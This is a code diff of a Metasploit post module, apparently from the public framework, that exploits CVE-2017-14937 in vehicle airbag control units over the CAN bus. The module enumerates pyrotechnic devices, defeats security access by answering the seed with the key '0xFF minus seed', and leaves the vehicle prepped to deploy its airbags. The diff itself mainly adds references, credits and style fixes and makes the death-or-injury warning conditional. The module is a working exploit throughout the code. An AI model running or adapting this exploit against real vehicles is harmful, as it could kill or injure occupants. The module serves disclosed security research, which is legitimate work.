@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'rex'
 require 'msf/core/post/hardware/automotive/uds'
 
@@ -14,25 +13,36 @@ class MetasploitModule < Msf::Post
 
   def initialize(info={})
     super( update_info( info,
-        'Name'          => 'Check For and Prep the Pyrotechnic Devices (Airbags)',
-        'Description'   => %q{ Post Module to query how many Pyrotechnit Devices (PDTs) are available
-                               in the vehicle.  It will then attempt to validate the security access
-                               token using the default simplified algorithm..  On success the vehicle
-                                will be prepped to deploy the airbags via the service routine. (ISO26021) },
+        'Name'          => 'Check For and Prep the Pyrotechnic Devices (Airbags, Battery Clamps, etc.)',
+        'Description'   => %q{ Acting in the role of a Pyrotechnical Device Deployment Tool (PDT), this module
+                               will first query all Pyrotechnic Control Units (PCUs) in the target vehicle
+                               to discover how many pyrotechnic devices are present, then attempt to validate
+                               the security access token using the default simplified algorithm.  On success,
+                               the vehicle will be in a state that is prepped to deploy its pyrotechnic devices
+                               (e.g. airbags, battery clamps, etc.) via the service routine. (ISO 26021) },
         'License'       => MSF_LICENSE,
-        'Author'        => ['Johannes Braun', 'Juergen Duerrwang'],
+        'Author'        => [
+          'Johannes Braun',    # original research
+          'Juergen Duerrwang', # original research
+          'Craig Smith'        # research and module author
+        ],
+        'References'    =>
+          [
+            [ 'CVE', '2017-14937' ],
+            [ 'URL', 'https://www.researchgate.net/publication/321183727_Security_Evaluation_of_an_Airbag-ECU_by_Reusing_Threat_Modeling_Artefacts' ]
+          ],
         'Platform'      => ['hardware'],
         'SessionTypes'  => ['hwbridge']
       ))
     register_options([
-      OptInt.new('SRCID', [true, "Module ID to query", 0x7f1]),
-      OptInt.new('DSTID', [false, "Expected reponse ID, defaults to SRCID + 8", 0x7f9]),
-      OptInt.new('PADDING', [false, "Padd the packet with extra bytes to always be 8 bytes long", 0x00]),
-      OptString.new('CANBUS', [false, "CAN Bus to perform scan on, defaults to connected bus", nil])
-    ], self.class)
+      OptInt.new('SRCID', [true, 'Module ID to query', 0x7f1]),
+      OptInt.new('DSTID', [false, 'Expected reponse ID, defaults to SRCID + 8', 0x7f9]),
+      OptInt.new('PADDING', [false, 'Pad the packet with extra bytes to always be 8 bytes long', 0x00]),
+      OptString.new('CANBUS', [false, 'CAN Bus to perform scan on, defaults to connected bus', nil])
+    ])
   end
 
-LOOP_TABLE = {
+  LOOP_TABLE = {
     0x00 => 'ISOSAEReserved',
     0x01 => 'airbag driver side frontal 1st stage',
     0x02 => 'airbag left side frontal 1st stage',
@@ -182,25 +192,25 @@ LOOP_TABLE = {
     0x93 => 'active steering column',
     0x94 => 'front screen - emergency release',
     0x95 => 'read window - emergency release'
-}
+  }
 
-ACL_TYPES = {
+  ACL_TYPES = {
     0x01 => 'CAN only',
     0x02 => 'ACL Comm Mode 12V',
     0x03 => 'ACL PWM FixedLevel 8V',
     0x04 => 'ACL Comm Mode 24V',
     0x05 => 'ACL PWM UbattLevel 12V',
     0x06 => 'ACL PWM UbattLevel 24V'
-}
+  }
 
-PCU_ADDRESS_FORMAT = {
+  PCU_ADDRESS_FORMAT = {
     0x01 => '11 bit normal addressing',
     0x02 => '11 bit extended addressing',
     0x03 => '11 bit mixed addressing',
     0x04 => '29 bit normal fixed addressing',
     0x05 => '29 bit mixed addressing',
     0x06 => '29 bit unique addressing'
-}
+  }
 
   def print_vin(vin)
     return "" if vin.nil?
@@ -219,7 +229,7 @@ PCU_ADDRESS_FORMAT = {
         end
       else
         if loopid[i] && loopid[i].hex == 0
-          print_status("     |  Deployment Status: Good")
+          print_status('     |  Deployment Status: Good')
         else
           print_status("     |  Deployment Status: Fail (#{loopid[i]})")
         end
@@ -230,7 +240,7 @@ PCU_ADDRESS_FORMAT = {
   def run
     opt = {}
     opt['PADDING'] = datastore['PADDING'] unless datastore['PADDING'].nil?
-    print_status("Gathering Data...")
+    print_status('Gathering Data...')
     vin = read_data_by_id(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], [0xF1, 0x90], opt)
     no_of_pcus = read_data_by_id(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], [0xFA, 0x00], opt)
     no_of_iso_version = read_data_by_id(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], [0xFA, 0x01], opt)
@@ -239,18 +249,18 @@ PCU_ADDRESS_FORMAT = {
     acl_type_definition = loopid[0]
     acl_type_version = loopid[1]
     no_of_charges = loopid[2]
-    
+
     print_vin(vin)
     print_loop_table(loopid)
     print_status(" Number of PCUs in vehicle     | #{no_of_pcus[0].hex}")
-    print_status(" Info About First PCU")
+    print_status(' Info About First PCU')
     print_status(" Address format this PCU(s)    | #{PCU_ADDRESS_FORMAT[address_format[0].hex]}")
     print_status(" Number of pyrotechnic charges | #{no_of_charges.hex}")
     print_status(" Version of ISO26021 standard  | #{no_of_iso_version[0].hex}")
     print_status(" ACL type                      | #{ACL_TYPES[acl_type_definition.hex]}")
     print_status(" ACL Type version              | #{acl_type_version.hex}")
     print_status
-    print_status("Switching to Diagnostic Session 0x04...")
+    print_status('Switching to Diagnostic Session 0x04...')
     resp = set_dsc(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], 0x04, opt)
     if resp.key? 'error'
       print_error("Could not switch to DSC 0x04: #{resp['error']}")
@@ -258,37 +268,42 @@ PCU_ADDRESS_FORMAT = {
     end
     # We may not need tester present at all because we will perform the action quickly
     send_tester_present(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], opt)
-    print_status("Getting Security Access Seed...")
+    print_status('Getting Security Access Seed...')
     seed = get_security_token(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], 0x5F, opt)
     if seed.key? 'error'
        print_error("Couldn't get seed: #{seed['error']}")
        return
     end
     print_status("Success.  Seed: #{seed['SEED']}")
-    print_status("Attempting to unlock device...")
+    print_status('Attempting to unlock device...')
+    display_warning = false
     if seed['SEED'][0].hex == 0 && seed['SEED'][1].hex == 0
-      print_status("Security Access Already Unlocked!!")
+      print_status('Security Access Already Unlocked!!')
+      display_warning = true
     else
       key = [0xFF - seed['SEED'][0].hex, 0xFF - seed['SEED'][1].hex]
-      resp = send_security_token_response(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], key, 0x60, opt) 
-      if resp.key? 'error' and not resp['error'].key? 'RCRRP'
+      resp = send_security_token_response(datastore['CANBUS'], datastore['SRCID'], datastore['DSTID'], key, 0x60, opt)
+      if (resp.key? 'error') && !(resp['error'].key? 'RCRRP')
         print_error("Invalid SA Response.  System not vulnerable. Error: #{resp['error']}")
         return
       end
       found_valid = false
-      if resp.key? 'Packets' and resp['Packets'].size > 0
+      if (resp.key? 'Packets') && resp['Packets'].size > 0
         resp['Packets'].each do |i|
-          found_valid = true if i.key? 'DATA' and i['DATA'].size > 1 and i['DATA'][1] == "67"
+          found_valid = true if (i.key? 'DATA') && i['DATA'].size > 1 && i['DATA'][1] == '67'
         end
       end
       if found_valid
-        print_status("Success!")
+        print_status('Success!')
+        display_warning = true
       else
         print_error("Unknown response: #{resp.inspect}")
       end
     end
-    print_warning("Warning! You're now able to start the deployment of airbags in this vehicle")
-    print_warning("Occupants of the vehicle face potential death and injury")
+    if display_warning
+      print_warning('Warning! You are now able to start the deployment of airbags in this vehicle')
+      print_warning('*** OCCUPANTS OF THE VEHICLE FACE POTENTIAL DEATH OR INJURY ***')
+    end
   end
 
 end
